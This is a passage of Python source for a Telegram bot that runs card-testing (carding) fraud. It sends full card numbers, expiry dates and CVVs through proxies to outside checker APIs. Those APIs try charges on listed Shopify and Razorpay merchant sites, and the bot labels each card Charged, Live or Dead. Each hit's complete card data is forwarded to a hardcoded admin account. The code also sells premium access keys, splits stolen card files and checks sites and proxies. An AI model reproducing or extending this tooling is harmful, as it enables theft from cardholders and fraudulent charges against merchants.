        brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
        gateway = result.get("gateway", "ꜱʜᴏᴘɪꜰʏ ᴘᴀʏᴍᴇɴᴛꜱ")
        price = result.get("price", "-")
        response_msg = str(result.get('message', 'Unknown Response'))[:180]
        if result['status'] == 'Charged':
            status_emoji = "💰"
            status_text = "Charged 💰"
        elif result['status'] == 'Approved':
            status_emoji = "🔍"
            status_text = "Live 🔍"
        else:
            status_emoji = "❗"
            status_text = "Dead ❗"
        ist = pytz.timezone('Asia/Kolkata')
        now = datetime.now(ist)
        current_time = now.strftime("%I:%M:%S %p IST")
        try:
            sender = await bot.get_entity(user_id)
            first_name = sender.first_name or "Unknown"
            tg_username = "@" + sender.username if sender.username else "No Username"
        except:
            first_name = "Unknown"
            tg_username = "No Username"
        if is_admin(user_id):
            plan = "👑 Admin"
        elif is_premium(user_id):
            plan = "💎 Premium"
        else:
            plan = "⭐ Free"
        try:
            me = await bot.get_me()
            bot_username = f"<a href='tg://user?id={me.id}'>{me.first_name or 'Bot'}</a>"
        except:
            bot_username = "<a href='tg://user?id=8823705089'>◢◤◢◤shopixlogs◤◢◤◢</a>"
        is_razorpay = "razorpay" in gateway.lower() or "rz" in gateway.lower()
        currency_symbol = "₹" if is_razorpay else ""
        admin_msg = f"""[❗] {status_text}
👤 {tg_username} | ID: <code>{user_id}</code>
💳
   § <code>{result['card']}</code>
Gate ▸ {gateway} {currency_symbol}{price}
━━━━━━━━━━━━
Resp ▸ {response_msg}
Bin ▸ <code>{brand} - {bank} - {country} {flag}</code>
━━━━━━━━━━━━
⏱ ▸ {current_time}
🔄 ▸ <a href="tg://user?id={user_id}">{first_name}</a> [{plan}]
🤩 ▸ {bot_username}"""
        admin_id = 8823705089
        await bot.send_message(admin_id, premium_emoji(admin_msg), parse_mode='html')
    except Exception as e:
        print(f"send_hit_to_admin error: {e}")

async def send_realtime_hit_group(user_id, result, hit_type, username):
    try:
        if result['status'] != 'Charged':
            return
        gateway = result.get('gateway', 'Unknown')
        price = result.get('price', '0.00')
        response_msg = str(result.get('message', 'Unknown')).lower()
        if "order_placed" in response_msg:
            response_msg = "ORDER_PLACED"
        elif "order_paid" in response_msg:
            response_msg = "ORDER_PAID"
        elif "_paid" in response_msg or "insufficient_funds" in response_msg:
            response_msg = "INSUFFICIENT_FUNDS"
        elif "charged" in response_msg:
            response_msg = "CHARGED"
        elif "thank you" in response_msg:
            response_msg = "PAYMENT_SUCCESSFUL"
        else:
            response_msg = response_msg.replace("_", " ").upper()[:60]
        if is_admin(user_id):
            plan = "admin 👑"
        elif is_premium(user_id):
            plan = "💎 Premium"
        else:
            plan = "⭐ Free"
        card_full = result.get('card', '')
        if '|' in card_full:
            card_num = card_full.split('|')[0]
            if len(card_num) >= 10:
                card_hidden = card_num[:6] + "******" + card_num[-4:]
            else:
                card_hidden = card_num[:6] + "****"
        else:
            card_hidden = "****"
        status_text = "ᴄʜᴀʀɢᴇᴅ 💰"
        message = f"""ᴄʜᴀʀɢᴇᴅ → {status_text}
ɢᴀᴛᴇ → <code>{gateway} {price} USD</code>
RES✅ → <code>{response_msg}</code>
ᴜsᴇʀ → <a href="tg://user?id={user_id}">{username}</a> [{plan}]"""
        buttons = [
            [Button.url("◢◤◢◤shopiixprobot◢◤◢◤◢", "https://t.me/foritxshopi_bot")]
        ]
        try:
            msg = await bot.send_message("foritgc", premium_emoji(message), parse_mode='html', buttons=buttons, silent=True)
            await bot.send_reaction("foritgc", msg.id, "💰")
        except:
            pass
        try:
            await bot.send_message(ADMIN_ID, premium_emoji(message), parse_mode='html')
        except:
            pass
    except Exception as e:
        print(f"send_realtime_hit_group error: {e}")

async def send_realtime_hit_dm(user_id, result, hit_type, username):
    try:
        if result["status"] not in ("Approved", "Charged"):
            return
        brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
        gateway = result.get("gateway", "ꜱʜᴏᴘɪꜰʏ ᴘᴀʏᴍᴇɴᴛꜱ")
        price = result.get("price", "-")
        is_razorpay = "razorpay" in gateway.lower() or "rz" in gateway.lower()
        response_msg = str(result.get('message', 'Unknown Response'))[:150]
        currency = "₹" if is_razorpay else ""
        current_time = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%I:%M:%S %p IST")
        if result['status'] == 'Charged':
            status_emoji = "💰"
            status_text = "Charged 💰"
        elif result['status'] == 'Approved':
            status_emoji = "🔍"
            status_text = "Live 🔍"
        else:
            status_emoji = "❗"
            status_text = "Dead ❗"
        if is_admin(user_id):
            plan = "👑 Admin"
        elif is_premium(user_id):
            plan = "💎 Premium"
        else:
            plan = "⭐ Free"
        try:
            me = await bot.get_me()
            bot_username = f"<a href='tg://user?id={me.id}'>{me.first_name or 'Bot'}</a>"
        except:
            bot_username = "<a href='tg://user?id=8823705089'>◢◤◢◤shopiixprobot◤◢◤◢</a>"
        hit_caption = f"""[❗] {status_text}
💳
   § <code>{result['card']}</code>
Gate ▸ {gateway} {currency}{price}
━━━━━━━━━━━━
Resp ▸ {response_msg}
Bin ▸ <code>{brand} - {bank} - {country} {flag}</code>
━━━━━━━━━━━━
⏱ ▸ {current_time}
🔄 ▸ <a href="tg://user?id={user_id}">{username}</a> [{plan}]
🤩 ▸ {bot_username}"""
        if result['status'] in ('Charged', 'Approved'):
            sent = await send_gift_video(user_id, result['card'], hit_caption)
            if not sent:
                await bot.send_message(user_id, premium_emoji(hit_caption), parse_mode='html', buttons=kb_bot_link())
        else:
            await bot.send_message(user_id, premium_emoji(hit_caption), parse_mode='html', buttons=kb_bot_link())
    except Exception as e:
        print(f"DM hit error: {e}")

async def auto_pin_charged(user_id, result):
    try:
        msg = await bot.send_message(user_id, "💰 **CHARGED HIT!**", parse_mode='html')
        await bot.pin_chat_message(user_id, msg.id, disable_notification=True)
    except:
        pass

# ===================== RAZORPAY FUNCTIONS =====================
async def check_card_razorpay(card, proxy, amount=1):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
        site = RAZORPAY_FIXED_SITE
        base_url = f"{RAZORPAY_API_BASE}?Key=aiojames&Site={site}&amount={amount}&cc={card}&proxy={proxy}"
        timeout = aiohttp.ClientTimeout(total=30)
        for attempt in range(60):
            try:
                url = base_url
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    async with session.get(url, ssl=False) as resp:
                        raw_text = await resp.text()
                        raw_text = raw_text.strip()
                if not raw_text or len(raw_text) < 5:
                    if attempt < 59:
                        await asyncio.sleep(0.8 + (attempt * 0.15))
                        continue
                    return {'status': 'Dead', 'message': 'Empty Response', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
                if raw_text.startswith('<') or not raw_text.startswith('{'):
                    if attempt < 59:
                        await asyncio.sleep(2.2 + (attempt * 0.2))
                        continue
                    return {'status': 'Dead', 'message': f'Bad Response: {raw_text[:80]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
                raw = None
                for json_attempt in range(16):
                    try:
                        raw = json.loads(raw_text)
                        break
                    except json.JSONDecodeError as je:
                        if attempt < 59 and json_attempt < 15:
                            await asyncio.sleep(0.6)
                            async with aiohttp.ClientSession(timeout=timeout) as session:
                                async with session.get(url, ssl=False) as retry_resp:
                                    raw_text = (await retry_resp.text()).strip()
                            continue
                        else:
                            if attempt < 59:
                                await asyncio.sleep(2.0 + attempt * 0.1)
                                continue
                            return {'status': 'Dead', 'message': f'Invalid JSON: {str(je)[:80]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
                if raw is None:
                    continue
                response_msg = str(raw.get('response', raw.get('Response', raw.get('message', '')))).strip()
                price = str(raw.get('Price', amount))
                status_str = str(raw.get('status', raw.get('success', ''))).lower()
                gate = "Razorpay"
                if any(x in status_str for x in ["charged", "success", "true"]) or any(x in response_msg.lower() for x in ["charged","order completed","order_placed","order_paid","insufficient_funds","thank you","payment successful"]):
                    return {'status':'Charged','message':response_msg,'card':card,'site':site,'gateway':gate,'price':price}
                elif any(x in status_str for x in ["approved", "success"]) or "otp" in response_msg.lower():
                    return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
                else:
                    return {'status': 'Dead', 'message': response_msg or "DECLINED", 'card': card, 'site': site, 'gateway': gate, 'price': price}
            except asyncio.TimeoutError:
                if attempt < 59:
                    await asyncio.sleep(2.0 + attempt * 0.2)
                    continue
                return {'status': 'Dead', 'message': 'Timeout', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
            except Exception as e:
                error_str = str(e).lower()
                if "expecting value" in error_str or "json" in error_str or "connection" in error_str:
                    if attempt < 59:
                        await asyncio.sleep(2.3 + (attempt * 0.18))
                        continue
                if attempt < 59:
                    await asyncio.sleep(2.0)
                    continue
                return {'status': 'Dead', 'message': f'Error: {str(e)[:120]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
        return {'status': 'Dead', 'message': 'Max 60 retries exceeded', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
    except Exception as e:
        return {'status': 'Dead', 'message': f'Outer Error: {str(e)[:100]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

# ==================== SITE CHECK HELPERS =====================
async def check_one_site(session, site):
    try:
        if not site.startswith("http"):
            site = "https://" + site
        async with session.get(site, allow_redirects=True) as resp:
            if resp.status < 500:
                return site, True
            return site, False
    except:
        return site, False

async def fast_site_check(sites):
    timeout = aiohttp.ClientTimeout(total=8)
    connector = aiohttp.TCPConnector(limit=50, ssl=False)
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = [check_one_site(session, site) for site in sites]
        results = await asyncio.gather(*tasks)
    alive = []
    dead = 0
    for site, ok in results:
        if ok:
            alive.append(site)
        else:
            dead += 1
    return alive, dead

# ===================== MULTI-DEVICE KEY FUNCTIONS =====================
def load_keys():
    try:
        with open(MULTI_KEYS_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_keys(keys):
    with open(MULTI_KEYS_FILE, "w") as f:
        json.dump(keys, f, indent=2)

def generate_multi_device_key(days, device_limit):
    prefix = "FOR-IT-MULTI"
    random_part = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))
    key = f"{prefix}-{random_part}-{days}D-{device_limit}U"
    keys = load_keys()
    keys[key] = {
        "days": days,
        "device_limit": device_limit,
        "used": 0,
        "users": [],
        "created": datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y-%m-%d %H:%M:%S"),
        "active": True
    }
    save_keys(keys)
    return key

def redeem_multi_device_key(key, user_id):
    keys = load_keys()
    if key not in keys:
        return "invalid"
    key_data = keys[key]
    if not key_data.get("active", False):
        return "invalid"
    if str(user_id) in key_data.get("users", []):
        return "used"
    if is_premium(user_id) or is_admin(user_id):
        return "already_premium"
    if key_data["used"] >= key_data["device_limit"]:
        return "device_limit_reached"
    key_data["used"] += 1
    key_data["users"].append(str(user_id))
    if key_data["used"] >= key_data["device_limit"]:
        key_data["active"] = False
    save_keys(keys)
    days = key_data["days"]
    expiry = (datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(PREMIUM_FILE, "a") as f:
            f.write(f"{user_id}|{expiry}\n")
    except:
        pass
    return "success"

def get_key_info(key):
    keys = load_keys()
    key_data = keys.get(key, {})
    if not key_data:
        return None
    return {
        "days": key_data.get("days", 0),
        "limit": key_data.get("device_limit", 0),
        "used": key_data.get("used", 0),
        "users": key_data.get("users", []),
        "created": key_data.get("created", "Unknown"),
        "active": key_data.get("active", False)
    }

# ===================== USER SITE/PROXY FUNCTIONS =====================
async def load_user_sites():
    if not os.path.exists(USER_SITES_FILE):
        return {}
    try:
        with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

async def save_user_sites(data):
    with open(USER_SITES_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def get_user_sites_sync(user_id):
    if not os.path.exists(USER_SITES_FILE):
        return []
    try:
        with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return data.get(str(user_id), [])
    except:
        return []

async def add_user_site(user_id, site):
    data = await load_user_sites()
    user_sites = data.get(str(user_id), [])
    if site not in user_sites:
        user_sites.append(site)
        data[str(user_id)] = user_sites
        await save_user_sites(data)
        return True
    return False

async def remove_user_site(user_id, site):
    data = await load_user_sites()
    user_sites = data.get(str(user_id), [])
    if site in user_sites:
        user_sites.remove(site)
        if user_sites:
            data[str(user_id)] = user_sites
        else:
            data.pop(str(user_id), None)
        await save_user_sites(data)
        return True
    return False

async def clear_user_sites(user_id):
    data = await load_user_sites()
    if str(user_id) in data:
        del data[str(user_id)]
        await save_user_sites(data)
        return True
    return False

async def load_user_proxies():
    if not os.path.exists(USER_PROXY_FILE):
        return {}
    try:
        with open(USER_PROXY_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
            if content:
                return json.loads(content)
            return {}
    except:
        return {}

async def save_user_proxies(data):
    try:
        os.makedirs(os.path.dirname(USER_PROXY_FILE) or '.', exist_ok=True)
        with open(USER_PROXY_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        return True
    except:
        return False

async def get_user_proxies_sync(user_id):
    data = await load_user_proxies()
    return data.get(str(user_id), [])

async def add_user_proxy(user_id, proxy):
    data = await load_user_proxies()
    user_proxies = data.get(str(user_id), [])
    if proxy not in user_proxies:
        user_proxies.append(proxy)
        data[str(user_id)] = user_proxies
        await save_user_proxies(data)
        return True
    return False

async def remove_user_proxy(user_id, proxy):
    data = await load_user_proxies()
    user_proxies = data.get(str(user_id), [])
    if proxy in user_proxies:
        user_proxies.remove(proxy)
        if user_proxies:
            data[str(user_id)] = user_proxies
        else:
            data.pop(str(user_id), None)
        await save_user_proxies(data)
        return True
    return False

# ===================== BLOCK FUNCTIONS =====================
def block_user(user_id):
    if not is_blocked(user_id):
        with open(BLOCK_FILE, "a") as f:
            f.write(f"{user_id}\n")

def unblock_user(user_id):
    if is_blocked(user_id):
        blocked = get_blocked_users()
        blocked.remove(str(user_id))
        with open(BLOCK_FILE, "w") as f:
            for uid in blocked:
                f.write(f"{uid}\n")

def get_blocked_users():
    try:
        with open(BLOCK_FILE, "r") as f:
            return f.read().splitlines()
    except:
        return []

# ===================== PROXY CHECK =====================
async def check_proxy(proxy: str):
    for attempt in range(1, 7):
        try:
            proxy = proxy.strip()
            test_card = "5154623245618097|03|2032|156"
            test_sites = [
                "https://punisher.myshopify.com",
                "https://blackrockcreationsus.myshopify.com",
                "https://kingdomcomecards.com",
                "https://paperieplanning.com",
                "https://dev-goodybeads.myshopify.com",
                "https://stencilrevolution.com",
                "https://blackhelmetapparel.com",
                "https://magneticjewelrysupply.myshopify.com"
            ]
            test_site = random.choice(test_sites)
            api_url = get_api()
            url = f"{api_url}?site={test_site}&cc={test_card}&proxy={proxy}"
            timeout = aiohttp.ClientTimeout(total=12)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as resp:
                    raw = await resp.json(content_type=None)
            response = str(raw.get("Response", "")).lower()
            DEAD = ("proxy dead", "invalid proxy format", "no proxy", "proxy error", "connection refused", "connection reset", "timeout", "timed out", "407", "502", "503", "504", "bad gateway", "gateway timeout", "socks error", "proxy connection failed", "tunnel connection failed", "cannot connect to proxy", "proxy rejected")
            if any(x in response for x in DEAD):
                if attempt < 5:
                    await asyncio.sleep(2)
                    continue
                return {"alive": False}
            return {"alive": True}
        except:
            if attempt < 5:
                await asyncio.sleep(2)
                continue
            return {"alive": False}
    return {"alive": False}

# ===================== USER SITE TEST =====================
async def test_site(site, proxy):
    test_card = "5154623245618097|03|2032|156"
    try:
        if not site.startswith("http"):
            site = f"https://{site}"
        api_url = get_api()
        url = f"{api_url}?site={site}&cc={test_card}&proxy={proxy}"
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)
        response_msg = str(raw.get("Response", "")).lower()
        if is_dead_site_error(response_msg):
            return {"site": site, "status": "dead"}
        return {"site": site, "status": "alive"}
    except:
        return {"site": site, "status": "dead"}

# ===================== STATS COMMAND =====================
@bot.on(events.NewMessage(pattern='/stats'))
async def stats_cmd(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❗ **Access Denied**\n\nOnly admins can use this command."))
        return
    status_msg = await event.reply(premium_emoji("⏳ Fetching stats..."))

    premium_users = []
    try:
        with open(PREMIUM_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                if line.strip():
                    uid = line.split('|')[0]
                    if uid.isdigit():
                        premium_users.append(int(uid))
    except:
        pass

    banned = get_blocked_users()
    sites = load_sites()
    rz_sites = get_file_lines(RZ_SITES_FILE)
    proxies = load_proxies()
    user_count = 0
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM users")
        user_count = cursor.fetchone()[0]
        conn.close()
    except:
        pass

    active_premium = 0
    for uid in premium_users:
        if is_premium(uid):
            active_premium += 1

    stats_msg = f"""<b>📊 BOT STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━
👥 <b>Total Users:</b> <code>{user_count}</code>
💎 <b>Active Premium:</b> <code>{active_premium}</code>
🚫 <b>Banned Users:</b> <code>{len(banned)}</code>
━━━━━━━━━━━━━━━━━━━━
🛒 <b>Shopify Sites:</b> <code>{len(sites)}</code>
💳 <b>Razorpay Sites:</b> <code>{len(rz_sites)}</code>
🌐 <b>Proxies:</b> <code>{len(proxies)}</code>
━━━━━━━━━━━━━━━━━━━━
🤖 <b>Bot By: <a href="tg://user?id=8823705089">◢◤◢◤shopiixprobot◤◢◤◢</a></b>"""
    await status_msg.edit(premium_emoji(stats_msg), parse_mode="html")

# ==================== TELEGRAM COMMANDS =====================
async def send_to_chat(chat_id, text, **kwargs):
    try:
        await bot.send_message(chat_id, text, **kwargs)
    except FloodWaitError as e:
        print(f"FloodWait: {e.seconds}s - waiting...")
        await asyncio.sleep(e.seconds)
        await bot.send_message(chat_id, text, **kwargs)
    except Exception as e:
        print(f"Send to chat error: {e}")

# ---- /checkapi ----
@bot.on(events.NewMessage(pattern='/checkapi'))
async def check_api_now(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❗ **Access Denied**\n\nOnly admins can use this command."))
        return
    status_msg = await event.reply(premium_emoji("⚡ **Checking API Status...**"))
    results = []
    working = 0
    dead = 0
    for i in range(1, 6):
        try:
            api_url = get_api()
            async with aiohttp.ClientSession() as sess:
                async with sess.get(f"{api_url}?site=https://test.com&cc=test&proxy=test", timeout=5) as resp:
                    if resp.status == 200:
                        results.append(f"✅ **API {i}** → 🟢 WORKING")
                        working += 1
                    else:
                        results.append(f"❗ **API {i}** → 🔴 DEAD")
                        dead += 1
        except:
            results.append(f"❗ **API {i}** → ⚠️ DEAD")
            dead += 1
    final_msg = f"""⚡ API STATUS CHECK ⚡
━━━━━━━━━━━━━━━━━━━━
{chr(10).join(results)}
━━━━━━━━━━━━━━━━━━━━
✅ Working: {working}
❗ Dead: {dead}"""
    await status_msg.edit(premium_emoji(final_msg), parse_mode="html")

# ---- /testapis ----
@bot.on(events.NewMessage(pattern='/testapis'))
async def test_all_apis(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❗ **Access Denied**\n\nOnly admins can use this command."))
        return
    status_msg = await event.reply(premium_emoji("⏳ **Testing all APIs...**"))
    apis = SHOPIFY_APIS
    test_card = "4061730206041873|11|2026|387"
    test_site = "https://st-marks-episcopal-church-school.myshopify.com"
    test_proxy = "127.0.0.1:8080"
    results = []
    working = 0
    dead = 0
    for i, api in enumerate(apis, 1):
        try:
            url = f"{api}?site={test_site}&cc={test_card}&proxy={test_proxy}"
            timeout = aiohttp.ClientTimeout(total=5)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        try:
                            data = await resp.json()
                            if data.get("Status") == True or data.get("status") == True:
                                results.append(f"✅ **API {i}** → <code>{api[:50]}...</code>\n▸ 🟢 **WORKING**")
                                working += 1
                            else:
                                results.append(f"⚠️ **API {i}** → <code>{api[:50]}...</code>\n▸ 🟡 **RESPONDING BUT MAYBE DEAD**")
                                dead += 1
                        except:
                            results.append(f"✅ **API {i}** → <code>{api[:50]}...</code>\n▸ 🟢 **WORKING (JSON OK)**")
                            working += 1
                    else:
                        results.append(f"❗ **API {i}** → <code>{api[:50]}...</code>\n▸ 🔴 **DEAD (Status: {resp.status})**")
                        dead += 1
        except Exception as e:
            results.append(f"❗ **API {i}** → <code>{api[:50]}...</code>\n▸ 🔴 **DEAD ({str(e)[:30]})**")
            dead += 1
    final_msg = f"""<b>⚡ API STATUS CHECK ⚡</b>
━━━━━━━━━━━━━━━━━━━━
{chr(10).join(results)}
━━━━━━━━━━━━━━━━━━━━
<b>📊 SUMMARY</b>
✅ Working: <code>{working}</code>
❗ Dead: <code>{dead}</code>
⏳ Time: <code>{datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%I:%M:%S %p IST')}</code>
━━━━━━━━━━━━━━━━━━━━
🤖 <b>Bot By: <a href="tg://user?id=8823705089">◢◤◢◤shopiixprobot◤◢◤◢</a></b>"""
    await status_msg.edit(premium_emoji(final_msg), parse_mode="html")

# ---- /split ----
@bot.on(events.NewMessage(pattern=r'^/split\s+(\d+)$'))
async def split_cards_command(event):
    user_id = event.sender_id
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❗ **Access Denied**\n\nOnly premium/admin can use this command."))
        return
    try:
        per_file = int(event.pattern_match.group(1))
        if per_file < 1:
            raise ValueError
    except:
        await event.reply(premium_emoji("❗ Usage: `/split 100` (100 cards per file)"))
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❗ Reply to a .txt file with `/split 100`"))
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not str(reply_msg.file.name).endswith('.txt'):
        await event.reply(premium_emoji("❗ Sirf .txt file reply kar."))
        return
    status_msg = await event.reply(premium_emoji("🔄 Processing file..."))
    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    cards = extract_cc(content)
    try: os.remove(file_path)
    except: pass
    if not cards:
        await status_msg.edit(premium_emoji("❗ No valid CCs found in file."))
        return
    total_cards = len(cards)
    await status_msg.edit(premium_emoji(f"🔄 Splitting {total_cards} cards into {per_file} per file..."))
    chunks = [cards[i:i + per_file] for i in range(0, len(cards), per_file)]
    sent = 0
    failed = 0
    for idx, chunk in enumerate(chunks, 1):
        try:
            timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
            filename = f"split_{idx}_{timestamp}.txt"
            async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
                for card in chunk:
                    await f.write(f"{card}\n")
            await bot.send_message(user_id, premium_emoji(f"📄 **Part {idx}** – {len(chunk)} cards"), file=filename, parse_mode="html")
            sent += 1
            await asyncio.sleep(0.5)
            try: os.remove(filename)
            except: pass
        except Exception as e:
            failed += 1
            print(f"❗ Split file error: {e}")
    await status_msg.edit(premium_emoji(f"""✅ **Split Complete!**
📊 Total Cards: <code>{total_cards}</code>
📶 Per File: <code>{per_file}</code>
📁 Total Files: <code>{len(chunks)}</code>
✅ Sent: <code>{sent}</code>
❗ Failed: <code>{failed}</code>
━━━━━━━━━━━━━━━━━━━━
💠 Use /chk on each file now!"""), parse_mode="html")

# ---- /site ----
@bot.on(events.NewMessage(pattern=r'^/site$'))
async def site_check_command(event):
    user_id = event.sender_id
    if is_admin(user_id):
        user_sites = get_user_sites_sync(user_id)
        global_sites = load_sites()
        sites = list(set(user_sites + global_sites))
        site_type = "Admin (Manual + Bot)"
    else:
        sites = get_user_sites_sync(user_id)
        site_type = "Manual"
    if not sites:
        if is_admin(user_id):
            sites = load_sites()
            site_type = "Bot Sites"
        else:
            await event.reply(premium_emoji("""❗ **No sites available!**
📌 **Add your sites first:**
<code>/addsites https://yoursite.com</code>
💠 **Check your sites:**
<code>/mysites</code>"""), parse_mode="html")
            return
    msg = await event.reply(premium_emoji(f"""<b>⚡ Site Checker Started</b>
👤 <b>Mode:</b> {site_type}
📊 <b>Total Sites:</b> <code>{len(sites)}</code>
🔄 <b>Checking...</b>"""), parse_mode="html")
    alive, dead = await fast_site_check(sites)
    if alive:
        txt_file = f"working_sites_{user_id}.txt"
        with open(txt_file, "w") as f:
            f.write("\n".join(alive))
        await bot.send_message(user_id, f"📄 **{len(alive)} Working Sites**", file=txt_file)
        os.remove(txt_file)
    if is_admin(user_id):
        buttons = [
            [Button.inline(f"🟢 MY SITES ({len(get_user_sites_sync(user_id))})", b"use_my_sites"),
             Button.inline(f"🔵 BOT SITES ({len(load_sites())})", b"use_global")],
            [Button.inline("🗑 CLEAR MY SITES", b"clear_my_sites")]
        ]
        await msg.edit(premium_emoji(f"""<b>✅ Site Check Complete</b>
👤 <b>Mode:</b> Admin (Both)
📊 <b>Total Checked:</b> <code>{len(sites)}</code>
✅ <b>Working:</b> <code>{len(alive)}</code>
❗ <b>Dead:</b> <code>{dead}</code>
📄 <b>TXT File Sent</b> ✅
<b>👇 Choose which sites to use for checking:</b>"""), buttons=buttons, parse_mode="html")
    else:
        user_count = len(get_user_sites_sync(user_id))
        await msg.edit(premium_emoji(f"""<b>✅ Site Check Complete</b>
👤 <b>Mode:</b> Your Sites
📊 <b>Total Checked:</b> <code>{len(sites)}</code>
✅ <b>Working:</b> <code>{len(alive)}</code>
❗ <b>Dead:</b> <code>{dead}</code>
📄 <b>TXT File Sent</b> ✅
━━━━━━━━━━━━━━━━━━━━
📌 <b>Your Sites:</b> <code>{user_count}</code>
💠 <code>/addsites url</code> | <code>/mysites</code>"""), parse_mode="html")

@bot.on(events.CallbackQuery(data=b"use_my_sites"))
async def use_my_sites_handler(event):
    user_id = event.sender_id
    user_sites = get_user_sites_sync(user_id)
    if user_sites:
        await event.answer(f"✅ Using YOUR {len(user_sites)} sites!", alert=True)
    else:
        await event.answer("❗ No personal sites! Using bot sites.", alert=True)

@bot.on(events.CallbackQuery(data=b"use_global"))
async def use_global_handler(event):
    global_sites = load_sites()
    await event.answer("✅ Using BOT SITES!", alert=True)

@bot.on(events.CallbackQuery(data=b"clear_my_sites"))
async def clear_my_sites_handler(event):
    user_id = event.sender_id
    count = len(get_user_sites_sync(user_id))
    if count > 0:
        await clear_user_sites(user_id)
        await event.answer(f"✅ Cleared {count} sites!", alert=True)
    else:
        await event.answer("❗ No sites to clear!", alert=True)

# ---- /addsite (single) ----
@bot.on(events.NewMessage(pattern=r'^/addsite\s+(.+)'))
async def user_add_site(event):
    user_id = event.sender_id
    site = event.pattern_match.group(1).strip()
    if not site.startswith("http"):
        site = f"https://{site}"
    status_msg = await event.reply(premium_emoji(f"🔄 Testing Site...\n\n<code>{site[:60]}</code>"), parse_mode="html")
    proxies = load_proxies()
    if not proxies:
        await status_msg.edit(premium_emoji("/addproxy add your proxy | ❗ No proxies available! Use /addproxy first."), parse_mode="html")
        return
    proxy = random.choice(proxies)
    test_card = "5154623245618097|03|2032|156"
    url = f"{get_api()}?site={site}&cc={test_card}&proxy={proxy}"
    try:
        timeout = aiohttp.ClientTimeout(total=25)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)
        response_msg = str(raw.get('Response', '')).lower()
        price = raw.get('Price', '-')
        if is_dead_site_error(response_msg):
            await status_msg.edit(premium_emoji(f"❗ Site Dead! Not Added.\n\n<code>{site[:60]}</code>"), parse_mode="html")
            return
        if await add_user_site(user_id, site):
            new_count = len(get_user_sites_sync(user_id))
            await status_msg.edit(premium_emoji(f"""✅ Site Added to Your List!
📊 Your Sites: <code>{new_count}</code>
💠 Price: <code>{price}</code>
💠 /mysites - View | /rm url - Remove"""), parse_mode="html")
        else:
            await status_msg.edit(premium_emoji("⚠️ Already in your list!"), parse_mode="html")
    except:
        await status_msg.edit(premium_emoji("❗ Test Failed! Not Added."), parse_mode="html")

# ---- /addsites (bulk) ----
@bot.on(events.NewMessage(pattern=r'^/addsites(\s|$)'))
async def bulk_add_sites(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❗ Admin only."))
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❗ Reply to a .txt file with sites (one per line)."))
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not str(reply_msg.file.name).endswith('.txt'):
        await event.reply(premium_emoji("❗ Reply to a .txt file."))
        return
    status_msg = await event.reply(premium_emoji("🔄 Processing sites file..."))
    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    try: os.remove(file_path)
    except: pass
    sites = [line.strip() for line in content.splitlines() if line.strip() and not line.startswith('#')]
    if not sites:
        await status_msg.edit(premium_emoji("❗ No sites found in file."))
        return
    sites = [s if s.startswith('http') else f"https://{s}" for s in sites]
    existing = set(load_sites())
    new_sites = [s for s in sites if s not in existing]
    if not new_sites:
        await status_msg.edit(premium_emoji("⚠️ All sites already exist."))
        return
    proxies = load_proxies()
    if not proxies:
        async with aiofiles.open(SITES_FILE, 'a') as f:
            for s in new_sites:
                await f.write(f"{s}\n")
        total = len(load_sites())
        await status_msg.edit(premium_emoji(f"✅ Added {len(new_sites)} sites (no proxy test). Total: {total}"))
        return
    added = []
    failed = []
    for site in new_sites:
        proxy = random.choice(proxies)
